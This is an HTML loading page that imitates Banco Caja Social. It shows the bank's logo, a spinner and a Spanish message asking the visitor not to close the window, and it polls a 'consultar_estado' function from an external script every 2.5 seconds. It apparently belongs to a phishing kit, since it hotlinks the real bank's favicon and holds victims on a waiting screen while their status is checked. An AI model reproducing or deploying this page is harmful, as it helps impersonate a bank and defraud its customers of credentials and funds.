<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando | Banco Caja Social</title>
    <link rel="icon" type="image/x-icon" href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <style>
        :root {
            --bcs-blue: #004b98;
            --bcs-yellow: #ffcc00;
        }

        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #ffffff;
            font-family: 'Roboto', sans-serif;
        }

        .loader-wrapper {
            text-align: center;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 90%;
        }

        .logo-bcs {
            max-width: 220px;
            height: auto;
            margin-bottom: 40px;
        }

        /* High quality CSS spinner */
        .spinner-container {
            position: relative;
            width: 64px;
            height: 64px;
            margin-bottom: 30px;
        }

        .spinner {
            box-sizing: border-box;
            display: block;
            position: absolute;
            width: 64px;
            height: 64px;
            border: 4px solid var(--bcs-blue);
            border-radius: 50%;
            animation: ripple 1.2s cubic-bezier(0, 0.2, 0.8, 1) infinite;
            border-color: var(--bcs-blue) transparent var(--bcs-blue) transparent;
        }

        .spinner:nth-child(2) {
            animation-delay: -0.5s;
            border-width: 3px;
            border-color: var(--bcs-yellow) transparent var(--bcs-yellow) transparent;
            width: 48px;
            height: 48px;
            top: 8px;
            left: 8px;
        }

        @keyframes ripple {
            0% { transform: rotate(0deg); opacity: 1; }
            100% { transform: rotate(360deg); opacity: 0.8; }
        }

        .loading-text {
            color: var(--bcs-blue);
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 0.5px;
            margin-top: 10px;
        }

        .sub-text {
            color: #777;
            font-size: 14px;
            margin-top: 12px;
        }

        /* Responsive adjustments */
        @media (max-width: 480px) {
            .logo-bcs {
                max-width: 180px;
            }
            .loading-text {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="loader-wrapper">
        <img src="logo-bcs.png" alt="Banco Caja Social" class="logo-bcs">
        
        <div class="spinner-container">
            <div class="spinner"></div>
            <div class="spinner"></div>
        </div>

        <div class="loading-text">Confirmando informaciÃ³n...</div>
        <div class="sub-text">Por favor no cierres ni actualices esta ventana.</div>
    </div>

    <script>
        $(document).ready(function() {
            // Re-use existing pooling logic
            setInterval(consultar_estado, 2500);
        });
    </script>
</body>
</html>

